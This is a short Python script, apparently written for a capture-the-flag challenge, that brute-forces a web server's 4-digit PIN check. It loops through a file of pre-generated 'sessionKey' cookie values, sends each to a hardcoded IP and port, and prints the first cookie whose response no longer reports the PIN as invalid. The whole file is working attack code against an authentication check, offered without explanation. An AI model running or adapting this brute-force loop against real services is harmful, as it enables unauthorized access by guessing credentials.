import requests

url = "http://34.159.76.30:32073"

try:
    response = requests.get(url)
    print(response.text)
except requests.exceptions.RequestException as e:
    print("Error:", e)

# Read cookies from a file, one per line
with open('output', 'r') as file:
    cookies = file.readlines()

# Iterate over each cookie
i = 9999;
for cookie in reversed(cookies):
    # Create a session
    session = requests.Session()
    
    # Set the cookie for the session
    session.cookies.set('sessionKey', cookie.strip())
    
    # Make a request using the session
    response = session.get('http://34.159.76.30:32073')

    if "pin is not valid. (hint)use your phone pin first 4" in response.text:
        print(f"[{i}] nope")
    else:
        print(cookie)
        break
    i = i - 1

